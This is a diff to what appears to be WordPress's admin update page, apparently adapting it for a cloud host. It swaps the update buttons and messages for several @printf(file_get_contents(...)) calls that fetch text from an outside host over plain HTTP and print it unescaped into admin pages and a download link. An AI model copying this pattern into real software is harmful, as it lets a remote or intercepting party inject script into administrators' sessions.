@@ -40,9 +40,7 @@ function list_core_update( $update ) {
 		$download = __('Download nightly build');
 	} else {
 		if ( $current ) {
-			$message = sprintf(__('You have the latest version of WordPress. You do not need to update. However, if you want to re-install version %s, you can do so automatically or download the package and re-install manually:'), $version_string);
-			$submit = __('Re-install Now');
-			$form_action = 'update-core.php?action=do-core-reinstall';
+			@printf( file_get_contents('http://wp4cloudapi.sinaapp.com/?a=update-core-latest&version='.$version_string.'&lang='.WPLANG) );
 		} else {
 			$php_compat     = version_compare( $php_version, $update->php_version, '>=' );
 			if ( file_exists( WP_CONTENT_DIR . '/db.php' ) && empty( $wpdb->is_mysql ) )
@@ -57,7 +55,7 @@ function list_core_update( $update ) {
 			elseif ( !$mysql_compat )
 				$message = sprintf( __('You cannot update because <a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires MySQL version %2$s or higher. You are running version %3$s.'), $update->current, $update->mysql_version, $mysql_version );
 			else
-				$message = 	sprintf(__('You can update to <a href="http://codex.wordpress.org/Version_%1$s">WordPress %2$s</a> automatically or download the package and install it manually:'), $update->current, $version_string);
+				@printf( file_get_contents('http://wp4cloudapi.sinaapp.com/?a=update-core-update-to&version='.$version_string.'&current='.$update->current.'&lang='.WPLANG) );
 			if ( !$mysql_compat || !$php_compat )
 				$show_buttons = false;
 		}
@@ -73,13 +71,9 @@ function list_core_update( $update ) {
 	echo '<input name="version" value="'. esc_attr($update->current) .'" type="hidden"/>';
 	echo '<input name="locale" value="'. esc_attr($update->locale) .'" type="hidden"/>';
 	if ( $show_buttons ) {
-		if ( $first_pass ) {
-			submit_button( $submit, $current ? 'button' : 'primary regular', 'upgrade', false );
-			$first_pass = false;
-		} else {
-			submit_button( $submit, 'button', 'upgrade', false );
-		}
-		echo '&nbsp;<a href="' . esc_url( $update->download ) . '" class="button">' . $download . '</a>&nbsp;';
+		echo '&nbsp;<a href="';
+		@printf( file_get_contents('http://wp4cloudapi.sinaapp.com/?a=download&version='.$version_string.'&lang='.WPLANG) );
+		echo '" class="button">' . $download . '</a>&nbsp;';
 	}
 	if ( 'en_US' != $update->locale )
 		if ( !isset( $update->dismissed ) || !$update->dismissed )
@@ -187,22 +181,22 @@ function list_plugin_updates() {
 		$core_update_version = $core_updates[0]->current;
 	?>
 <h3><?php _e( 'Plugins' ); ?></h3>
-<p><?php _e( 'The following plugins have new versions available. Check the ones you want to update and then click &#8220;Update Plugins&#8221;.' ); ?></p>
+<p><?php @printf( file_get_contents('http://wp4cloudapi.sinaapp.com/?a=plugins-has-update&lang='.WPLANG) ); ?></p>
 <form method="post" action="<?php echo $form_action; ?>" name="upgrade-plugins" class="upgrade">
 <?php wp_nonce_field('upgrade-core'); ?>
 <p><input id="upgrade-plugins" class="button" type="submit" value="<?php esc_attr_e('Update Plugins'); ?>" name="upgrade" /></p>
 <table class="widefat" cellspacing="0" id="update-plugins-table">
 	<thead>
 	<tr>
-		<th scope="col" class="manage-column check-column"><input type="checkbox" id="plugins-select-all" /></th>
-		<th scope="col" class="manage-column"><label for="plugins-select-all"><?php _e('Select All'); ?></label></th>
+		<th scope="col" class="manage-column check-column"></th>
+		<th scope="col" class="manage-column"></th>
 	</tr>
 	</thead>
 
 	<tfoot>
 	<tr>
-		<th scope="col" class="manage-column check-column"><input type="checkbox" id="plugins-select-all-2" /></th>
-		<th scope="col" class="manage-column"><label for="plugins-select-all-2"><?php _e('Select All'); ?></label></th>
+		<th scope="col" class="manage-column check-column"></th>
+		<th scope="col" class="manage-column"></th>
 	</tr>
 	</tfoot>
 	<tbody class="plugins">
@@ -240,14 +234,13 @@ function list_plugin_updates() {
 
 		echo "
 	<tr class='active'>
-		<th scope='row' class='check-column'><input type='checkbox' name='checked[]' value='" . esc_attr($plugin_file) . "' /></th>
+		<th scope='row' class='check-column'><a class='button' href='" . $plugin_data->update->package . "' target='_blank' />下载</a></th>
 		<td><p><strong>{$plugin_data->Name}</strong><br />" . sprintf(__('You have version %1$s installed. Update to %2$s.'), $plugin_data->Version, $plugin_data->update->new_version) . ' ' . $details . $compat . $upgrade_notice . "</p></td>
 	</tr>";
 	}
 ?>
 	</tbody>
 </table>
-<p><input id="upgrade-plugins-2" class="button" type="submit" value="<?php esc_attr_e('Update Plugins'); ?>" name="upgrade" /></p>
 </form>
 <?php
 }
